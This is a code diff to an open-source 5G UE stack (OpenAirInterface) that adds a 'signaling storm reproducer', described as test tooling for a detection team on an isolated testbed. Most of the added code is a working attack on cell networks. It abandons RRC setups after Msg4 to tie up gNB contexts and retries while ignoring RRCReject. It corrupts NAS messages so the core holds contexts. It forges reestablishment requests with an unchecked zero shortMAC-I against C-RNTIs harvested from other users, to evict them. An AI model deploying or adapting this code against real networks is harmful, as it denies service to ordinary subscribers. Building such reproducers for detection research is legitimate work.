+   LOG_D(PHY, "Locked in ul, slot %d\n", ul_info->slot);
+ 
+-  LOG_T(NR_MAC, "Not calling scheduler mac->ra.ra_state = %d\n", mac->ra.ra_state);
++  LOG_T(NR_MAC, "Not calling scheduler mac->ra->ra_state = %d\n", mac->ra->ra_state);
+ 
+   if (is_ul_slot(ul_info->slot, &mac->frame_structure))
+     nr_ue_ul_scheduler(mac, ul_info);
+@@ -335,7 +335,7 @@ static uint32_t nr_ue_dl_processing(NR_UE_MAC_INST_t *mac, nr_downlink_indicatio
+           if (!dl_info->rx_ind->rx_indication_body[i].pdsch_pdu.ack_nack) {
+             LOG_W(PHY, "Received a RAR-Msg2 but LDPC decode failed\n");
+             // resume RAR response window timer if MSG2 decoding failed
+-            nr_timer_suspension(&mac->ra.response_window_timer);
++            nr_timer_suspension(&mac->ra->response_window_timer);
+           } else {
+             LOG_I(PHY, "[UE %d] RAR-Msg2 decoded\n", mac->ue_id);
+           }
+diff --git a/openair2/NR_UE_PHY_INTERFACE/NR_Packet_Drop.c b/openair2/NR_UE_PHY_INTERFACE/NR_Packet_Drop.c
+index 0e431e5..539dc0c 100644
+--- a/openair2/NR_UE_PHY_INTERFACE/NR_Packet_Drop.c
++++ b/openair2/NR_UE_PHY_INTERFACE/NR_Packet_Drop.c
+@@ -105,8 +105,8 @@ bool should_drop_transport_block(int slot, uint16_t rnti)
+ 
+   /* We want to avoid dropping setup messages because this would be pathological. */
+   NR_UE_MAC_INST_t *mac = get_mac_inst(0);
+-  if (mac->ra.ra_state < nrRA_SUCCEEDED) {
+-    LOG_D(NR_MAC, "Not dropping because MAC state: %d", mac->ra.ra_state);
++  if (mac->ra->ra_state < nrRA_SUCCEEDED) {
++    LOG_D(NR_MAC, "Not dropping because MAC state: %d", mac->ra->ra_state);
+     return false;
+   }
+ 
+@@ -116,7 +116,7 @@ bool should_drop_transport_block(int slot, uint16_t rnti)
+   int num_pdus = slot_rnti_mcs[slot].num_pdus;
+   assert(slot < 20 && slot >= 0);
+   LOG_D(NR_MAC, "rnti: %x  num_pdus %d state %d slot %u sinr %f\n",
+-        rnti, num_pdus, mac->ra.ra_state, slot, slot_rnti_mcs[slot].sinr);
++        rnti, num_pdus, mac->ra->ra_state, slot, slot_rnti_mcs[slot].sinr);
+   assert(num_pdus > 0);
+   CHECK_INDEX(slot_rnti_mcs[slot].rnti, num_pdus);
+   CHECK_INDEX(slot_rnti_mcs[slot].mcs, num_pdus);
+diff --git a/openair2/RRC/NR_UE/rrc_UE.c b/openair2/RRC/NR_UE/rrc_UE.c
+index 7858a82..753f380 100644
+--- a/openair2/RRC/NR_UE/rrc_UE.c
++++ b/openair2/RRC/NR_UE/rrc_UE.c
+@@ -371,7 +371,13 @@ static void nr_decode_SI(NR_UE_RRC_SI_INFO *SI_info, NR_SystemInformation_t *si,
+   }
+ }
+ 
+-static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
++/* rss_src tells the reproducer which generation this is. The payload is built
++   twice per RA: once when the retry is triggered and once by
++   nr_rrc_prepare_msg3_payload() "in advance" of Msg3. Only the latter is the
++   one MAC actually transmits, so only that one is counted as an attempt and
++   carries the authoritative ue_identity. Measured 2026-10-20: without this
++   split the UE logged exactly 2 attempts per real RA (403:202, 401:203). */
++static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc, const char *rss_src)
+ {
+   RRCLOG_D("Generation of RRCSetupRequest\n");
+   uint8_t rv[6];
+@@ -386,6 +392,28 @@ static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
+ #endif
+   }
+ 
++  if (nr_rss_enabled()) {
++    /* A-type ground truth: one record per on-air attempt, with the identity
++       actually transmitted (randomValue is rv[0..4] with the last bit unused). */
++    const bool on_air = rss_src != NULL && rss_src[0] == 'm'; /* "msg3" */
++    if (on_air)
++      nr_rss_next_seq((int)rrc->ue_id);
++    nr_rss_log((int)rrc->ue_id,
++               on_air ? "attempt_start" : "setup_req_prebuilt",
++               "\"ue_identity\":\"0x%02x%02x%02x%02x%02x\",\"identity_type\":\"%s\",\"src\":\"%s\"",
++               rv[0],
++               rv[1],
++               rv[2],
++               rv[3],
++               rv[4] & 0xfe,
++               rrc->fiveG_S_TMSI == UINT64_MAX ? "randomValue" : "ng-5G-S-TMSI-Part1",
++               rss_src ? rss_src : "?");
++    /* Variant: do not pay for the Msg3->Msg4 wait. See nr_rss_wait_for_msg4().
++       Needs ra_gate=0, otherwise the in-flight RA holds the restart anyway. */
++    if (on_air && (!nr_rss_wait_for_msg4() || nr_rss_is_harvester((int)rrc->ue_id)))
++      nr_rss_arm_retry(rrc, 0);
++  }
++
+   uint8_t buf[1024];
+   int len = do_RRCSetupRequest(buf, sizeof(buf), rv, rrc->fiveG_S_TMSI);
+ 
+@@ -707,6 +735,23 @@ static nr_pdcp_entity_security_keys_and_algos_t get_security_rrc_parameters(NR_U
+ }
+ 
+ /** @brief Check if there is dedicated NAS information to forward to NAS */
++/* A-NAS (rss-landscape.md 3.2, LTEFuzz "BTS resource depletion").
++   The gNB's RRC setup guard is cancelled the moment Msg5 arrives, so a
++   completed context has no expiry and its lifetime is decided by the core.
++   We then make sure the core never finishes anything: the 5GMM message type is
++   replaced with an unassigned value, so the AMF cannot act on the payload,
++   never resolves a SUPI (the held contexts therefore cannot collapse onto one
++   subscriber) and has no NAS procedure to accept or reject.
++   Plain 5GMM header: [EPD 0x7E][security header type][message type].
++   Isolated testbed only -- UE side only, the gNB is untouched. */
++static void nr_rss_blind_initial_nas(int ue, uint8_t *nas_data, uint32_t length)
++{
++  if (!nr_rss_is_anas(ue) || nas_data == NULL || length < 3 || nas_data[0] != 0x7e)
++    return;
++  nas_data[2] = 0xf0;
++  LOG_I(NR_RRC, "[RSS] A-NAS UE %d: initial NAS blinded (%u B)\n", ue, length);
++}
++
+ static void nr_rrc_process_dedicatedNAS_MessageList(NR_UE_RRC_INST_t *rrc, NR_RRCReconfiguration_v1530_IEs_t *rec_1530)
+ {
+   if (rec_1530->dedicatedNAS_MessageList) {
+@@ -2121,8 +2166,56 @@ static void nr_rrc_prepare_msg3_payload(NR_UE_RRC_INST_t *rrc)
+     return;
+   switch (rrc->ra_trigger) {
+     case RRC_CONNECTION_SETUP:
++      /* RSS eviction: put a forged RRCReestablishmentRequest on CCCH instead of the
++         setup request. shortMAC-I is not checked on the branch this targets, so it is
++         sent as zero; the AS-security path in
++         nr_rrc_ue_prepare_RRCReestablishmentRequest() is bypassed deliberately - an
++         attacker has no AS context and does not need one here. */
++      if (nr_rss_enabled() && !nr_rss_is_probe((int)rrc->ue_id)
++          && nr_rss_is_evictor((int)rrc->ue_id, NB_UE_INST)) {
++        static int sweep;
++        const int lo = (int)nr_rss_sweep_lo() > 0 ? (int)nr_rss_sweep_lo() : 1;
++        const int hi = (int)nr_rss_sweep_hi();
++        const int span = (hi >= lo) ? (hi - lo + 1) : 1;
++        /* Prefer a C-RNTI harvested from someone else's RAR; fall back to the sweep
++           until the first one arrives. */
++        int crnti = (int)nr_rss_pick_victim_crnti();
++        const bool targeted = crnti != 0;
++        if (!targeted)
++          crnti = lo + (sweep++ % span);
++        /* Skip C-RNTIs we were assigned ourselves: evicting our own abandoned
++           contexts costs the victim nothing. Bounded scan so a saturated range
++           cannot spin. */
++        for (int guard = 0; guard < span && nr_rss_is_own_crnti((unsigned)crnti); guard++)
++          crnti = lo + (sweep++ % span);
++        if (nr_rss_is_own_crnti((unsigned)crnti)) {
++          /* Everything in range is ours. Forging against our own context is pure
++             self-harm, and the bounded guard loop above can fall out still holding
++             an own C-RNTI when the range is small. Measured 2026-10-22: with the
++             adaptive window anchored on the newest allocations - which are almost
++             all ours - three of four runs collapsed to 0.6 s of air time. Send an
++             ordinary setup request instead, which still loads the cell. */
++          nr_rrc_ue_prepare_RRCSetupRequest(rrc, "msg3");
++          break;
++        }
++        uint8_t ebuf[1024];
++        int elen = do_RRCReestablishmentRequest(ebuf,
++                                                NR_ReestablishmentCause_otherFailure,
++                                                (uint32_t)nr_rss_evict_pci(),
++                                                (rnti_t)crnti,
++                                                0 /* shortMAC-I: unchecked on this path */);
++        if (elen > 0) {
++          nr_rlc_srb_recv_sdu(rrc->ue_id, 0, ebuf, elen);
++          nr_rss_next_seq((int)rrc->ue_id);
++          nr_rss_log((int)rrc->ue_id, "attempt_start",
++                     "\"kind\":\"reest_evict\",\"target_crnti\":\"0x%04x\",\"pci\":%d,\"targeted\":%s",
++                     crnti, nr_rss_evict_pci(), targeted ? "true" : "false");
++          break;
++        }
++        LOG_W(NR_RRC, "[RSS] do_RRCReestablishmentRequest failed (%d), falling back\n", elen);
++      }
+       // preparing RRC setup request payload in advance
+-      nr_rrc_ue_prepare_RRCSetupRequest(rrc);
++      nr_rrc_ue_prepare_RRCSetupRequest(rrc, "msg3");
+       break;
+     case RRC_CONNECTION_REESTABLISHMENT:
+       // preparing MSG3 for re-establishment in advance
+@@ -2270,6 +2363,12 @@ static void rrc_ue_generate_RRCSetupComplete(NR_UE_RRC_INST_t *rrc, const uint8_
+     } else {
+       // Send Initial NAS message (Registration Request) before Security Mode control procedure
+       generateRegistrationRequest(&initialNasMsg, nas, false);
++      /* The pending-NAS path is only taken when NAS pushed an initial UL
++         transfer first. An rss-triggered RA has no pending NAS, so Msg5 builds
++         a fresh Registration Request right here -- blind this copy too, or an
++         A-NAS holder would register for real with the configured IMSI and the
++         AMF would collapse every holder onto one subscriber. */
++      nr_rss_blind_initial_nas((int)rrc->ue_id, initialNasMsg.nas_data, initialNasMsg.length);
+     }
+     if (!initialNasMsg.nas_data) {
+       RRCLOG_E("Failed to complete RRCSetup. NAS InitialUEMessage message not found.\n");
+@@ -2459,12 +2558,61 @@ static int8_t nr_rrc_ue_decode_ccch(NR_UE_RRC_INST_t *rrc, const NRRrcMacCcchDat
+        case NR_DL_CCCH_MessageType__c1_PR_rrcReject:
+          RRCLOG_W("Logical Channel DL-CCCH (SRB0), Received RRCReject \n");
+          nr_rrc_process_rrcreject(rrc, dl_ccch_msg->message.choice.c1->choice.rrcReject);
++         if (nr_rss_enabled()) {
++           /* Stock code stops here when the gNB sends no waitTime, which is the
++              OCUDU default, so the reproducer schedules the retry itself. */
++           NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
++           bool t302 = nr_timer_is_active(&tac->T302);
++           nr_rss_log((int)rrc->ue_id, "rrc_reject",
++                      "\"actual_reach\":\"rrc_reject\",\"t302_running\":%s,\"honor_reject\":%s",
++                      t302 ? "true" : "false",
++                      nr_rss_honor_reject() ? "true" : "false");
++           if (!nr_rss_honor_reject())
++             nr_rss_arm_retry(rrc, 10);
++           else if (t302)
++             nr_rss_arm_retry(rrc, nr_timer_remaining_time(&tac->T302) + 10);
++           else
++             nr_rss_arm_retry(rrc, nr_rss_reject_backoff_ms());
++         }
+          rval = 0;
+          break;
+ 
+        case NR_DL_CCCH_MessageType__c1_PR_rrcSetup:
+          RRCLOG_I("[RAPROC] Logical Channel DL-CCCH (SRB0), Received NR_RRCSetup\n");
+-         nr_rrc_process_rrcsetup(rrc, dl_ccch_msg->message.choice.c1->choice.rrcSetup);
++         if (nr_rss_enabled()
++             && !(nr_rss_is_probe((int)rrc->ue_id) && !nr_rss_probe_ra_only())
++             && !nr_rss_is_anas((int)rrc->ue_id)
++             && !nr_rss_complete_this_attempt()) {
++           /* A-type: Msg4 is accepted and MAC still sends the HARQ ACK, but
++              nr_rrc_process_rrcsetup() is skipped, so no cell group is applied,
++              no RRCSetupComplete is generated and RRC stays in IDLE. The gNB is
++              left with an incomplete procedure until its own guard expires. */
++           NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
++           nr_timer_stop(&tac->T300);
++           nr_rss_note_msg4((int)rrc->ue_id);
++           nr_rss_note_skip();
++           nr_rss_log((int)rrc->ue_id,
++                      "msg4_rx",
++                      "\"intended_reach\":\"msg5_skip\",\"actual_reach\":\"msg5_skip\",\"tc_rnti\":\"0x%04x\",\"occupancy\":%u",
++                      rrc->rnti,
++                      nr_rss_occupancy());
++           nr_rss_arm_retry(rrc, 0);
++         } else {
++           if (nr_rss_enabled()) {
++             nr_rss_note_msg4((int)rrc->ue_id);
++             nr_rss_log((int)rrc->ue_id,
++                        "msg4_rx",
++                        "\"intended_reach\":\"msg5_sent\",\"actual_reach\":\"msg5_sent\",\"tc_rnti\":\"0x%04x\"",
++                        rrc->rnti);
++           }
++           nr_rrc_process_rrcsetup(rrc, dl_ccch_msg->message.choice.c1->choice.rrcSetup);
++           /* A-NAS churn: Msg5 is queued now. The gNB will hold this completed
++              context for its 3000 ms NGAP guard regardless of what we do next, so
++              take another slot instead of sitting on the link. anas_gap_ms must be
++              long enough for Msg5 to reach the air. */
++           if (nr_rss_enabled() && nr_rss_is_anas((int)rrc->ue_id) && nr_rss_anas_gap_ms() > 0)
++             nr_rss_arm_retry(rrc, nr_rss_anas_gap_ms());
++         }
+          rval = 0;
+          break;
+ 
+@@ -2898,7 +3046,9 @@ static int nr_rrc_ue_decode_dcch(NR_UE_RRC_INST_t *rrc,
+             NR_DLInformationTransfer_IEs_t *dlInfo_IE = dlInfo->criticalExtensions.choice.dlInformationTransfer;
+             /* This message hold a dedicated info NAS payload, forward it to NAS */
+             NR_DedicatedNAS_Message_t *dedicatedNAS_Message = dlInfo_IE->dedicatedNAS_Message;
+-            if (dedicatedNAS_Message) {
++            /* A-NAS: never answer the core. The AMF keeps retransmitting and the
++               gNB keeps the completed RRC context, which is what we hold. */
++            if (dedicatedNAS_Message && !nr_rss_is_anas((int)rrc->ue_id)) {
+               MessageDef *ittiMsg = itti_alloc_new_message(TASK_RRC_NRUE, rrc->ue_id, NAS_DOWNLINK_DATA_IND);
+               dl_info_transfer_ind_t *msg = &NAS_DOWNLINK_DATA_IND(ittiMsg);
+               msg->UEid = rrc->ue_id;
+@@ -3442,13 +3592,15 @@ void *rrc_nrue(void *notUsed)
+       free(rrc->pending_initial_nas.nas_data);
+       rrc->pending_initial_nas.nas_data = req->nasMsg.nas_data;
+       rrc->pending_initial_nas.length = req->nasMsg.length;
++      nr_rss_blind_initial_nas((int)rrc->ue_id, rrc->pending_initial_nas.nas_data, rrc->pending_initial_nas.length);
+       RRCLOG_I("Initial NAS UL: no SRB yet; buffered %u B for RRCSetupComplete dedicatedNAS (RRC state=%d)\n",
+                req->nasMsg.length,
+                rrc->nrRrcState);
+-      if (rrc->nrRrcState == RRC_STATE_IDLE_NR) {
++      if (rrc->nrRrcState == RRC_STATE_IDLE_NR
++          && !nr_rss_probe_withheld((int)rrc->ue_id)) { /* not arrived yet */
+         RA_trigger_t prev_trigger = rrc->ra_trigger;
+         rrc->ra_trigger = RRC_CONNECTION_SETUP;
+-        nr_rrc_ue_prepare_RRCSetupRequest(rrc);
++        nr_rrc_ue_prepare_RRCSetupRequest(rrc, "nas");
+         nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_SETUP);
+         RRCLOG_I("Triggering MAC RA for RRCSetupComplete pending NAS (prev_trigger=%d)\n", prev_trigger);
+       }
+@@ -3650,6 +3802,7 @@ void nr_rrc_going_to_IDLE(NR_UE_RRC_INST_t *rrc,
+   }
+   // Stop all the timers except T302, T320 and T325
+   nr_timer_stop(&tac->T300);
++  nr_timer_stop(&tac->rss_retry_timer);
+   nr_timer_stop(&tac->T301);
+   nr_timer_stop(&tac->T304);
+   nr_timer_stop(&tac->T310);
+@@ -3778,7 +3931,7 @@ void handle_302_expired_stopped(NR_UE_RRC_INST_t *rrc)
+ void handle_t300_expiry(NR_UE_RRC_INST_t *rrc)
+ {
+   rrc->ra_trigger = RRC_CONNECTION_SETUP;
+-  nr_rrc_ue_prepare_RRCSetupRequest(rrc);
++  nr_rrc_ue_prepare_RRCSetupRequest(rrc, "t300");
+ 
+   nr_rrc_trigger_mac_ra(rrc, NR_MAC_RA_START_T300);
+ 
+diff --git a/openair2/RRC/NR_UE/rrc_defs.h b/openair2/RRC/NR_UE/rrc_defs.h
+index edb1c9e..bdbe119 100644
+--- a/openair2/RRC/NR_UE/rrc_defs.h
++++ b/openair2/RRC/NR_UE/rrc_defs.h
+@@ -142,6 +142,12 @@ typedef struct UE_RRC_SI_INFO_NR_s {
+ typedef struct NR_UE_Timers_Constants_s {
+   // timers
+   NR_timer_t T300;
++  /* RRC signaling storm reproducer (A-type). Not 3GPP. See nr_rss_* in
++     rrc_timers_and_constants.c. The timer only polls once per tick; the real
++     schedule is the wall-clock deadline, because one tick is one radio frame
++     message and those do not arrive every 10 ms over ZMQ. */
++  NR_timer_t rss_retry_timer;
++  uint64_t rss_deadline_ns;        /* when the next attempt is due, 0 = not armed */
+   NR_timer_t T301;
+   NR_timer_t T302;
+   NR_timer_t T304;
+diff --git a/openair2/RRC/NR_UE/rrc_proto.h b/openair2/RRC/NR_UE/rrc_proto.h
+index b359d35..e19589f 100644
+--- a/openair2/RRC/NR_UE/rrc_proto.h
++++ b/openair2/RRC/NR_UE/rrc_proto.h
+@@ -72,6 +72,61 @@ void nr_rrc_ue_decode_NR_SBCCH_SL_BCH_Message(NR_UE_RRC_INST_t *rrc,
+                                               const uint16_t rx_slss_id);
+ 
+ void nr_rrc_set_mac_queue(instance_t instance, notifiedFIFO_t *mac_input_nf);
++
++/* ---------------------------------------------------------------------------
++ * RRC signaling storm reproducer, A-type (UE side only).
++ *
++ * Reproduces "initial access not completed": the UE receives Msg4 (RRCSetup),
++ * lets MAC send the HARQ ACK, never generates RRCSetupComplete, and asks for a
++ * new RRCSetupRequest after a configurable interval. Used to validate the
++ * team's detection/mitigation loop on an isolated testbed. The gNB is never
++ * modified.
++ *
++ * Knobs come from the "rss" config prefix, e.g.
++ *   --rss.enable 1 --rss.interval_ms 100 --rss.max_duration_s 30 \
++ *   --rss.run_id A-2026w38-001 --rss.log_file /tmp/rss_attempts.jsonl
++ * Implementation and the knob table live in rrc_timers_and_constants.c.
++ * -------------------------------------------------------------------------*/
++bool nr_rss_enabled(void);
++bool nr_rss_complete_this_attempt(void);
++bool nr_rss_honor_reject(void);
++int nr_rss_harvest_ues(void);
++bool nr_rss_is_harvester(int ue);
++int nr_rss_probe_ues(void);
++bool nr_rss_probe_ra_only(void);
++void nr_rss_note_own_crnti(int ue, unsigned crnti);
++void nr_rss_note_victim_crnti(unsigned crnti);
++unsigned nr_rss_pick_victim_crnti(void);
++bool nr_rss_is_own_crnti(unsigned crnti);
++bool nr_rss_is_evictor(int ue, int n_ue);
++int nr_rss_evict_lo(void);
++int nr_rss_evict_hi(void);
++int nr_rss_evict_pci(void);
++bool nr_rss_is_probe(int ue);
++int nr_rss_probe_delay_ms(void);
++bool nr_rss_probe_withheld(int ue);
++int nr_rss_anas_ues(void);
++bool nr_rss_is_anas(int ue);
++int nr_rss_anas_gap_ms(void);
++int nr_rss_evict_sticky_ms(void);
++int nr_rss_evict_min_age_ms(void);
++int nr_rss_evict_max_age_ms(void);
++unsigned nr_rss_sweep_lo(void);
++unsigned nr_rss_sweep_hi(void);
++int nr_rss_ra_depth(void);
++int nr_rss_reject_backoff_ms(void);
++/* Per-UE counters: with --num-ues > 1 every instance runs its own attempt
++   stream, so seq must be per UE and each record must say which UE it came
++   from. A single global counter interleaved the streams and made per-attempt
++   joins impossible (observed 2026-10-20 on the 2-UE run). */
++unsigned nr_rss_next_seq(int ue);
++bool nr_rss_wait_for_msg4(void);
++void nr_rss_note_msg4(int ue);
++void nr_rss_note_skip(void);
++unsigned nr_rss_occupancy(void);
++void nr_rss_arm_retry(NR_UE_RRC_INST_t *rrc, int delay_ms);
++void nr_rss_log(int ue, const char *event, const char *fmt, ...) __attribute__((format(printf, 3, 4)));
++
+ /** @}*/
+ #endif
+ 
+diff --git a/openair2/RRC/NR_UE/rrc_timers_and_constants.c b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
+index 0addfe5..e4d2c4b 100644
+--- a/openair2/RRC/NR_UE/rrc_timers_and_constants.c
++++ b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
+@@ -4,6 +4,976 @@
+ 
+ #include "openair2/RRC/NR_UE/rrc_proto.h"
+ #include "executables/softmodem-common.h"
++#include "common/config/config_userapi.h"
++#include "LAYER2/NR_MAC_UE/mac_proto.h"
++#include "nr-uesoftmodem.h" /* MAX_NUM_NR_UE_INST, NB_UE_INST */
++#include <stdarg.h>
++#include <stdio.h>
++#include <time.h>
++
++/* ---------------------------------------------------------------------------
++ * RRC signaling storm reproducer, A-type (UE side only). See rrc_proto.h.
++ *
++ * Scope rules kept deliberately narrow:
++ *  - nothing here changes gNB behaviour or any 3GPP timer value;
++ *  - with --rss.enable 0 (default) every function below is inert, so the same
++ *    binary is also the regression-test binary for normal attach;
++ *  - max_duration_s is an in-process kill switch: when it fires the UE goes
++ *    back to completing RRC setup normally.
++ * -------------------------------------------------------------------------*/
++#define RSS_CFG_PREFIX "rss"
++
++typedef struct {
++  int enable;
++  int interval_ms;
++  int reject_backoff_ms;
++  int honor_reject;
++  int completion_pct;
++  int max_duration_s;
++  int ack_gate;
++  int ra_gate;
++  int gate_timeout_ms;
++  int target_occupancy;
++  int probe_ues;
++  int probe_ra_only;
++  int probe_delay_ms;
++  int anas_ues;
++  int anas_gap_ms;
++  int evict_sticky_ms;
++  int evict_min_age_ms;
++  int evict_max_age_ms;
++  int evict_adaptive;
++  int evict_window;
++  int harvest_ues;
++  int evict_ues;
++  int evict_crnti_lo;
++  int evict_crnti_hi;
++  int evict_pci;
++  int ra_depth;
++  int msg4_wait;
++  int hold_ms;
++  int tick_report;
++  char *run_id;
++  char *log_file;
++} rss_cfg_t;
++
++static rss_cfg_t rss_cfg;
++
++/* clang-format off */
++#define RSS_PARAMS_DESC { \
++  {"enable",            "1 = A-type: receive Msg4, skip RRCSetupComplete, retry\n",      0, .iptr=&rss_cfg.enable,            .defintval=0,                        TYPE_INT,    0}, \
++  {"interval_ms",       "delay between a skipped Msg5 and the next RRCSetupRequest\n",   0, .iptr=&rss_cfg.interval_ms,       .defintval=100,                      TYPE_INT,    0}, \
++  {"reject_backoff_ms", "delay after RRCReject when the gNB sent no waitTime\n",         0, .iptr=&rss_cfg.reject_backoff_ms, .defintval=1000,                     TYPE_INT,    0}, \
++  {"honor_reject",      "1 = obey RRCReject waitTime/backoff, 0 = retry at once\n",      0, .iptr=&rss_cfg.honor_reject,      .defintval=1,                        TYPE_INT,    0}, \
++  {"completion_pct",    "percent completed normally. >0 ends the run at the first one\n",  0, .iptr=&rss_cfg.completion_pct,    .defintval=0,                        TYPE_INT,    0}, \
++  {"max_duration_s",    "kill switch: stop the reproducer after this many seconds\n",    0, .iptr=&rss_cfg.max_duration_s,    .defintval=60,                       TYPE_INT,    0}, \
++  {"ack_gate",          "1 = never restart RA while the Msg4 HARQ ACK PUCCH is pending\n", 0, .iptr=&rss_cfg.ack_gate,        .defintval=1,                        TYPE_INT,    0}, \
++  {"ra_gate",           "1 = never restart RA while one is still in flight\n",            0, .iptr=&rss_cfg.ra_gate,           .defintval=1,                        TYPE_INT,    0}, \
++  {"gate_timeout_ms",   "force the retry if a gate held it this long (0 = never force)\n", 0, .iptr=&rss_cfg.gate_timeout_ms,   .defintval=500,                      TYPE_INT,    0}, \
++  {"target_occupancy",  "hold this many incomplete contexts at the gNB (0 = unlimited)\n", 0, .iptr=&rss_cfg.target_occupancy, .defintval=0,                        TYPE_INT,    0}, \
++  {"evict_ues",         "how many of the highest-numbered instances forge reestablishment\n", 0, .iptr=&rss_cfg.evict_ues,         .defintval=1,                        TYPE_INT,    0}, \
++  {"evict_crnti_lo",    "sweep RRCReestablishmentRequest over C-RNTI lo..hi (0 = off)\n",   0, .iptr=&rss_cfg.evict_crnti_lo,    .defintval=0,                        TYPE_INT,    0}, \
++  {"evict_crnti_hi",    "upper bound of the C-RNTI sweep\n",                              0, .iptr=&rss_cfg.evict_crnti_hi,    .defintval=0,                        TYPE_INT,    0}, \
++  {"evict_pci",         "PCI put in the forged ReestabUE-Identity\n",                     0, .iptr=&rss_cfg.evict_pci,         .defintval=1,                        TYPE_INT,    0}, \
++  {"probe_ra_only",     "probe keeps redoing RA (skips Msg5) so each RA faces the attack\n", 0, .iptr=&rss_cfg.probe_ra_only,     .defintval=0,                        TYPE_INT,    0}, \
++  {"probe_delay_ms",    "probe waits this long before its FIRST attach (models a UE arriving\n", 0, .iptr=&rss_cfg.probe_delay_ms,    .defintval=0,                        TYPE_INT,    0}, \
++  {"probe_ues",         "instances 0..N-1 act as ordinary UEs (connect normally)\n",     0, .iptr=&rss_cfg.probe_ues,         .defintval=0,                        TYPE_INT,    0}, \
++  {"anas_ues",          "instances [probe_ues, +N) send Msg5 then never answer the core\n", 0, .iptr=&rss_cfg.anas_ues,          .defintval=0,                        TYPE_INT,    0}, \
++  {"anas_gap_ms",       "A-NAS: ms after Msg5 before the next RA (0 = hold the link)\n",  0, .iptr=&rss_cfg.anas_gap_ms,       .defintval=0,                       TYPE_INT,    0}, \
++  {"evict_sticky_ms",   "how long eviction stays on one harvested victim before refresh\n", 0, .iptr=&rss_cfg.evict_sticky_ms,   .defintval=0,                      TYPE_INT,    0}, \
++  {"evict_min_age_ms",  "ignore harvested C-RNTIs younger than this (filters our own)\n",  0, .iptr=&rss_cfg.evict_min_age_ms,  .defintval=150,                      TYPE_INT,    0}, \
++  {"evict_max_age_ms",  "ignore harvested C-RNTIs older than this (filters dead ones)\n",  0, .iptr=&rss_cfg.evict_max_age_ms,  .defintval=4000,                     TYPE_INT,    0}, \
++  {"evict_adaptive",    "1 = sweep follows the highest observed C-RNTI instead of lo..hi\n",  0, .iptr=&rss_cfg.evict_adaptive,    .defintval=1,                        TYPE_INT,    0}, \
++  {"evict_window",      "width of the adaptive sweep below the highest observed C-RNTI\n",    0, .iptr=&rss_cfg.evict_window,      .defintval=64,                       TYPE_INT,    0}, \
++  {"harvest_ues",       "instances dedicated to preamble+RAR cycles to feed the harvest\n",   0, .iptr=&rss_cfg.harvest_ues,       .defintval=0,                        TYPE_INT,    0}, \
++  {"ra_depth",          "concurrent RA procedures per UE instance (1 = upstream)\n",     0, .iptr=&rss_cfg.ra_depth,          .defintval=1,                        TYPE_INT,    0}, \
++  {"msg4_wait",         "1 = A-type (wait for Msg4, then skip Msg5). 0 = abandon at Msg3\n", 0, .iptr=&rss_cfg.msg4_wait,        .defintval=1,                        TYPE_INT,    0}, \
++  {"hold_ms",           "gNB hold time per incomplete context (t300 + guard)\n",         0, .iptr=&rss_cfg.hold_ms,           .defintval=2000,                     TYPE_INT,    0}, \
++  {"tick_report",       "log the measured RRC tick rate every N ticks (0 = off)\n",      0, .iptr=&rss_cfg.tick_report,       .defintval=100,                      TYPE_INT,    0}, \
++  {"run_id",            "run identifier written into every JSONL record\n",              0, .strptr=&rss_cfg.run_id,          .defstrval="rss-run",                TYPE_STRING, 0}, \
++  {"log_file",          "per-attempt JSONL ground truth for the detection team\n",       0, .strptr=&rss_cfg.log_file,        .defstrval="/tmp/rss_attempts.jsonl", TYPE_STRING, 0}, \
++}
++/* clang-format on */
++
++static bool rss_cfg_done;
++static bool rss_killed;
++static uint64_t rss_t0_ns;
++#define RSS_MAX_UE MAX_NUM_NR_UE_INST
++static unsigned rss_seq[RSS_MAX_UE];
++static unsigned rss_completed;
++static FILE *rss_log_fd;
++static bool rss_got_msg4[RSS_MAX_UE]; /* did the current attempt reach Msg4? */
++/* Closed-loop occupancy control.
++   The occupancy the gNB sees is N = (incomplete attempts started in the last
++   T_hold). The UE can count that itself: every attempt we leave incomplete
++   holds one context for exactly hold_ms. So target_occupancy becomes a real
++   knob without any feedback from the gNB: below target we keep attacking,
++   at target we idle. Measured 2026-10-20: interval_ms alone cannot do this,
++   because the realised Msg4 rate saturates near 3.8/s regardless of interval. */
++#define RSS_OCC_WINDOW 512
++static uint64_t rss_skip_ts[RSS_OCC_WINDOW];
++static unsigned rss_skip_head;
++static unsigned rss_occ_hold_logs;
++static unsigned rss_gate_logs;
++/* Probe bookkeeping: a probe is the measurement for "can a normal UE still
++   connect", so it retries like a real UE instead of making one attempt. The
++   first probe runs produced RRCSetupComplete counts of 5/1/2/0/0 with
++   attempt_start == 1, i.e. a single Bernoulli trial against a 35% ceiling
++   dwell, which is noise rather than a measurement. */
++static unsigned rss_probe_tries[RSS_MAX_UE];
++static uint64_t rss_probe_t0[RSS_MAX_UE];
++static uint64_t rss_probe_next_ns[RSS_MAX_UE];
++static bool rss_probe_done[RSS_MAX_UE];
++static uint64_t rss_gate_since_ns;   /* when a gate first held this attempt back */
++static unsigned rss_ticks;       /* RRC ticks seen while enabled */
++static uint64_t rss_tick_t0_ns;  /* start of the current tick-rate window */
++/* Air time. One RRC tick is one radio frame (10 ms of air). The ZMQ device has
++   no pacing code and OAI selects TIME_SOURCE_REALTIME for it (virtual
++   IQ-driven time is only used for --rfsim), so the radio is *expected* to run
++   in real time. On this testbed it does not: the frame counter advances about
++   3-6x slower than the wall clock, while the gNB release timer stays on the
++   wall clock. Every record therefore carries both clocks, so a reader can tell
++   "attempts per second of air time" from "attempts per second of wall time".
++   Without that split the labels understate a real attacker by the same factor
++   and would mislead detection thresholds. */
++static uint64_t rss_air_frame;   /* monotonic radio frame = hfn*1024 + frame */
++static uint64_t rss_air_frame_t0;
++
++static uint64_t rss_now_ns(void)
++{
++  struct timespec ts;
++  clock_gettime(CLOCK_REALTIME, &ts);
++  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
++}
++
++static const rss_cfg_t *rss_get_cfg(void)
++{
++  if (!rss_cfg_done) {
++    paramdef_t params[] = RSS_PARAMS_DESC;
++    config_get(config_get_if(), params, sizeofArray(params), RSS_CFG_PREFIX);
